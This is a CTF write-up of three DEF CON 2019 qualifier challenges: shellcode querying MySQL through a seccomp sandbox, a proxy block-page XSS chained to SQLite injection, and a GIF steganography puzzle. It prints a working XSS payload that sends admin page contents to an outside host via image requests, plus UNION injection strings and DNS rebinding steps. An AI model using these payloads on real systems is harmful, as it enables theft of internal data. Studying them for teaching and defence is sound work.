# DEF CON CTF Qualifier 2019

This writeup is written by HITCON⚔BFKinesiS. We attended DEFCON CTF Qual as an joint team HITCON⚔BFKinesiS (HITCON, Balsn, BambooFox, DoubleSigma and KerKerYuan) this year.

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190513-defconctfqual/) of this writeup.**


 - [DEF CON CTF Qualifier 2019](#def-con-ctf-qualifier-2019)
   - [Web](#web)
     - [return_to_shellql](#return_to_shellql)
     - [ooops](#ooops)
       - [Solution 1: XSS](#solution-1-xss)
       - [Solution 2: DNS rebinding](#solution-2-dns-rebinding)
       - [Failed Attempts](#failed-attempts)
   - [Misc](#misc)
     - [Redacted-Puzzle](#redacted-puzzle)


## Web

### return_to_shellql

This is the most disappointing and astonishing challenge in this year's DEFCON qual.

We have the source code of the server:

```php
#!/usr/bin/php-cgi
<?php

if (isset($_GET['source']))
{
   show_source(__FILE__);
   exit();
}

$link = mysqli_connect('127.0.0.1:31337', 'shellql', 'shellql', 'shellql');

//sleep(300);


if (isset($_POST['shell']))
{
   $hexdshell = bin2hex($_POST['shell']);
   $txt = "HERE is shell length = " . (strlen($hexdshell)/2) . "-----------------------------\n" . $hexdshell . "\n------------------------------\n";
   $myfile = file_put_contents('/tmp/logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
   fwrite($myfile, $txt);
   fclose($myfile);

   if (strlen($_POST['shell']) <= 1000)
   {
          echo $_POST['shell'];
          shellme($_POST['shell']);
   }
   exit();
}
```

The `shellme()` is implemented as a php extension. We also have the binary `shellme.so`. Basically it will execute shellcode with [seccomp](https://en.wikipedia.org/wiki/Seccomp) protection.

The description of the challenge mentions the flag is in `/flag`, so we probably need local file inclusion or RCE to read the flag. Because seccomp is enabled when executing the shellcode, we can only read/write the file descriptors that are already opened:

0. stdin
1. stdout
2. stderr
3. `/tmp/.ZendSem.jTNX5u`: it's opend as RW, which seems to be a php temp file.
4. MySQL socket

The only fd that could be used to read loca files will be MySQL. Can we use MySQL to read `/flag`? Let's first run a few queries thorugh this shellcode:

```python
#!/usr/bin/env python2

from pwn import *
import requests
import sys
import string

context(arch='amd64', os='linux')
query = '\x03' + sys.argv[1] if sys.argv[1] else raw_input('> ')
packet = p32(len(query)) + query
stdout = 1
sql_fd = 4
payload  = shellcraft.echo('\n', stdout) # for 200 response
payload += shellcraft.pushstr (packet)
payload += shellcraft.write(sql_fd, 'rsp', len(packet))
payload += shellcraft.read(sql_fd, 'rsp', 10000)
payload += shellcraft.write(stdout, 'rsp', 'rax')
shellcode = asm(payload)
url = "http://shellretql.quals2019.oooverflow.io:9090/cgi-bin/index.php" 
r = requests.post(url, data={'shell': shellcode})

print repr(r.text)
print
printable = set(string.printable) - set('\x0c\x0b')
print ''.join([i if i in printable else ' ' for i in r.text])
```

- The `shellql` db contains nothing interesting
- `show grants;` Permission: select and usage. Almost the same as read-only.
- `select @@version`: 5.7.26-0ubuntu0.18.04.1, latest

Then we tried various approaches to load file in MySQL, but all failed.

- XXE in `LOAD XML`: MySQL doesn't parse external entities.
- `LOAD_FILE()`/ `LOAD DATA INFILE`: We don't have file permission and we need to bypass `secure_file_priv`.
- [Client-side arbitrary file inclusion `LOCAL INFLE`](https://w00tsec.blogspot.com/2018/04/abusing-mysql-local-infile-to-read.html): This aims to read clients files. We don't have a MySQL client here.
- Rather than MySQL query, use other MySQL protocol to open files: [COM_BINLOG_DUMP](https://mariadb.com/kb/en/library/com_binlog_dump/) , but we don't have REPLICATION SLAVE privilege
- `select * from information_schema.processlist`: we can peek other team's queries
- become root via `auth_socket`: nope
- guessing root's password through `COM_CHANGE_USER` command: since the firstblood solved this challenge in 50 minutes, and this is DEFCON Qual, we don't think it's about guessing password 

In addition, the file operation of `logs.txt` does not make any sense here:

```php
   $myfile = file_put_contents('/tmp/logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);
  fwrite($myfile, $txt);
  fclose($myfile);
```

The return value of `file_put_contents` is how many bytes are written, instead of a file resource. Even it could [return boolean false](https://www.php.net/manual/en/function.file-put-contents.php), according to [php src](https://lxr.room11.org/xref/php-src%40master/Zend/zend_API.h#zend_parse_arg_resource), both `fwrite` and `fclose`  will check the argument type.

We stuck here for more than 36 hours, and the challenge is still solved by only one team: how can *SeoulPlusBadAss* got firstblood in just 50 minutes?

10 hours left for the qualification, suddenly in IRC:

```
ATTENTION: SeoulPlusBadAss, please PM me ASAP or you will just be unhappy later
```

Interesting. Did they screw up this challenge or made it unsolvable? Soon after the challenge was in maintenance and unstable for about an hour. I was still dumping `processlist` and hope to discover some interesting payload, only to found a fake flag. 

Because I think it's fake. I didn't expect this challenge could be solved by just dumping payloads. So I don't even try to submit this one. However, this fake flag did make me curious because it didn't follow MySQL's response protocol. The header was missing. I wondered if the MySQL was pwned. 

```
16:16 <@zardus> ATTENTION HACKERS! We've undone massive horizontal scaling of shellretql in favor of massive vertical scaling. Though our test exploits have been successfully landing on this service the whole CTF, this change more closely replicates conditions when it first launched. HACK IT!

Hash of the flag: 9214822b06e543db1bd94951e0955d1e0899bce16b490c18cd35ef8cd8d21c432424fa19c94e1c75b375db162371c9c5f39ec894890861e6cbcdc57833ef9813
```

Then in the next 30 minutes, 7 teams solved this chalenge. Okay okay let's try `select * from information_schema.processlist;` again to dump other team's payload. It turned out that the previous fake flag I found is actually the real flag...... WTF......

Meanwhile, on our team's Slack, there are numerous `WTF?` `????` `XD` when someone submited it. Actually I solved this challenge two hour ago. I even copied the flag but I was too lazy to submit it.

There is an [offcial twitter post](https://twitter.com/oooverflow/status/1127740964754186240) explaining what happened to this challenge.



### ooops

> Solved by: bookgin, Kaibro, seadog007, k1tten

#### Solution 1: XSS

In this challenge, we're given a [proxy PAC file](https://developer.mozilla.org/en-US/docs/Web/HTTP/Proxy_servers_and_tunneling/Proxy_Auto-Configuration_(PAC)_file). It's used to automatically determine the request should be proxied or not.

```javascript
function FindProxyForURL(url, host) {
 /* The only overflow employees can access is Order of the Overflow. Log in with OnlyOne:Overflow */
 if (shExpMatch(host, 'oooverflow.io')) return 'DIRECT';return 'PROXY ooops.quals2019.oooverflow.io:8080';
}
```

We launch Chromium with this proxy server and try to visit oooverflow.io:

```shell
# Chromium will ask for the credentials. Log in with OnlyOne:Overflow as documented in the PAC file.
$ chromium --proxy-server="ooops.quals2019.oooverflow.io:8080" "http://oooverflow.io"
```

The proxy returns a webpage saying "http://oooverflow.io is blocked." We can also submit a link to admin to send a site unblock request.

After a few trial and error, we observe:

1. If the url contains `oooverflow` (excluding the GET parameter), the page will be blocked.
2. On the block page, there is a XSS vulnerability. `http://oooverflow.io/<img src=x>`
3. The admin will visit the URL in the site unblock request. The referer in the HTTP header is `http://10.0.1.81:5000/admin/view/19`.
4. The admin's UA is `Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.1.1 Safari/538.1`. This does not support some js syntax like `fetch()`, `let i = 0`.

The objective is clear: stealing the data in `http://10.0.1.81:5000/`.

Leveraging 1 & 3, we can forge a url `http://10.0.1.81:5000/oooverflow/<img src=x>` including our XSS payload and send to admin. Since the page will be blocked, it will trigger our XSS payload. Additionally, the url is the same origin as `http://10.0.1.81:5000/`. We are allowed to read arbitrary content on the origin.

However, the XSS payload will be split 55 characters. The js in the page will insert annoying `<br/>`.

```javascript
function split_url(u) {
    u = decodeURIComponent(u); // Stringify
    output = u[0];
    for (i=1;i<u.length;i++) {
        output += u[i]
        if (i%55==0) output+= "<br/>";
    }
    console.log(output)
    return output
}
window.onload = function () {
    d = document.getElementById("blocked");
    d.innerHTML=(split_url(document.location) + " is blocked")
}
```

This could be simply bypassed via js comment `/*<br/>*/`, or using `location.hash` to chain longer payloads. Another annoying one is the admin will change his internal IP every minutes. `10.0.1.101:5000`,`10.0.1.81:5000` .... but at least we can dynamically determine which URL to redirect based on the referer header.

Here is my HTTP server, including the XSS payload:

```python
#!/usr/bin/env python3
from flask import Flask, request, redirect
import base64

app = Flask(__name__)

def genurl(ip): # e.g. 10.1.2.3:5000
    def b64e(x):
        return base64.b64encode(x.encode()).decode()

    host = 'http://'+ip+'/oooverflow'
    
    js = '''
var snd = function(data) {
document.getElementsByTagName('body')[0].appendChild(document.createElement('img')).src='http://example.com:5000/a?'+data;
}

setInterval(function(){snd('ping');},500+500);

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var txt = xhr.responseText;
snd(btoa(txt));
}
}
xhr.open('GET', 'http://REPLACEME/admin/view/1', true);
xhr.send(null);
'''.replace('REPLACEME', ip)
    
    assert '"' not in js
    b64_js = b64e(js)
    
    xss = '<img src=x onerror="eval(atob(\'{}\'))">'.format(b64_js)
    delimeter = "'/**/+'"
    payload = 'bbbb' # shift 4 bytes
    delta = 55 - len(delimeter)
    for i in range(0, len(xss), delta):
        print(xss[i:i+delta] + delimeter)
        payload += xss[i:i+delta] + delimeter
    payload = payload[:-len(delimeter)] # remove last delimeter
    payload = host.ljust(56, 'a') + payload
    return payload

@app.route('/')
def index():
    ip = request.environ.get('HTTP_X_FORWARDED_FOR').rsplit(',')[-1]
    ip = ip + ':5000'
    return redirect(genurl(ip), code=302)

if __name__ == '__main__':
    app.run(port=5000, host="0.0.0.0")
```

However, the `http://10.0.1.81:5000/` page has nothing interesting at all. `http://10.0.1.81:5000/admin/view/19` contains a suspicious HTML comment: `<!-- Query: select rowid,* from requests where rowid=2; -->`

This is obviously a SQL injection hint. The rest is a simple SQLi challenge. @kaibro solved the rest.

Visit: `/admin/view/1 order by 10`

We will get `SQL Error: 1st ORDER BY term out of range - should be between 1 and 5`.

From this error message, we know it is SQLite db and the column number is 5.

Then dump the table structure: `/admin/view/1 and 1=2 union select 1,2,3,sql,5 from sqlite_master where type='table'`

=> `CREATE TABLE flag (name TEXT, flag TEXT)`

Dump flag: `/admin/view/1 and 1=2 union select 1,2,3,flag,5 from flag`:

=> `OOO{C0rporateIns3curity}`


#### Solution 2: DNS rebinding

Because the internal server does not validate HTTP host header, it's also worth mentioning that DNS rebinding can also be used to solve this challenge. It should work but I fail to reproduce because the admin's internal URL is changing so fast. That leads to a low successful rate of DNS rebinding. (In the earlier the challange is protected with recaptcha, and admin seems to change internal IP address every a few minutes. After the recaptcha is removed, the internal IP keeps changing every request we sent.) The attack procedure is listed as follows:

1. Set up our evil website and listen on `240.240.240.240:5000/admin/view/SQLi`.
2. Set up a DNS server resolving `example.com` randomly to `A 240.240.240.240`  or `A 10.0.1.81` with TTL = 0. Note that you cannot resolve it to two A records. The browser will always resolve to the private IP first. 
3. Send the crafted SQL injection link `http://example.com:5000/admin/view/SQLi` to admin.
4. If we are lucky enough, it will resolve to our evil website `240.240.240.240`.
5. On our evil website, the js will send multiple XHR request to `example.com:5000/admin/view/SQLi` and read the response text.
6. If we are lucky enough, the address will resolve to `10.0.1.81`. Sincer the origin is still `example.com:5000`, we don't violate the same-origin policy. We can easily extract the flag.

For more information about browser bahaviors regarding DNS rebinding please read [@bookgin's article](https://bookgin.tw/2019/01/05/abusing-dns-browser-based-port-scanning-and-dns-rebinding/#attack-scenario). 

#### Failed Attempts

- [PhantomsJS local file inclusion](https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/): @vtim found PhantomJS has to visit `file:///` protocol such that the local file will be the same origin, but in this challenge it's visiting `http://` protocol. We cannot read local files by this approach.
- DNS rebinding: Actually this should not be considered as failed attempts. We use DNS rebinding technique to read the content of `http://10.0.1.81:5000/` and `http://10.0.1.81:5000/admin/view/19`. Unfortunately we didn't notice the HTML comment.

## Misc

### Redacted-Puzzle

In this challenge, we're given a black gif picture.

We can extract every frame from this gif file by any online gif tool.

Using StegSolver, we will find out these polygons for every frame images as below:

![](https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/puzzle.png)

And first frame image tell us the flag alphabet: `+-=ABCDEFGHIJKLMNOPQRSTUVWXYZ_{}`

![](https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/0.png)

<br>

After observation, we found that polygons have some special features, e.g. there is only 3~5 length type of edges.

So we guess it seems like to choose some points from Octagonal and connect each point to draw these polygons.

![](https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/ori.png)

![](https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/ori2.png)

![](https://raw.githubusercontent.com/w181496/CTF/master/defcon2019-qual/redacted-puzzle/ori3.png)


if the selected point is regarded as 1 and the remaining points are treated as 0, watch clockwise from the top left

we will get the following bit string:

0.png: `10001100`

1.png: `01100011`

...

and the repeated binary `10001` is equal to decimal `17`.

`alphabet[17] = 'O'`

These repeated `O` looks like the prefix of the flag.

So our target is to collect every 8 bits from all frame images and divide them into groups of 5.

The only thing to note is that each image will rotate slightly counterclockwise.

`OOO{FORCES-GOVERN+TUBE+FRUIT_GROUP=FALLREMEMBER_WEATHER}`
